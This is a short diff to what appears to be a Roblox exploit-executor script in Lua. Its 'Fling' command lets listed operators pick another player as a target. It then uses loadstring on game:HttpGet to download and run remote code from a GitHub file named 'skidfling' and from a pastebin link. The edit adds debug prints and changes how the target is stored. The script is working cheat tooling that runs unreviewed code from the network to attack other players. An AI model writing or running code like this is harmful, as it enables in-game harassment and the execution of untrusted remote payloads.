@@ -145,12 +145,14 @@ local function Fling(speaker, raw)
 	if not Ops[speaker.UserId] then return end
 	local targetRaw = Trim(raw:sub(5) or "")
 	if targetRaw ~= "" then 
+		print("df")
 		local targetPlayer = GetPlayer(targetRaw)
 		if targetPlayer then
-			getgenv().Target = targetPlayer.Name
+			getgenv().Target = targetPlayer
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
 		end
 	else
+		print("dfj")
 		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 	end
 end
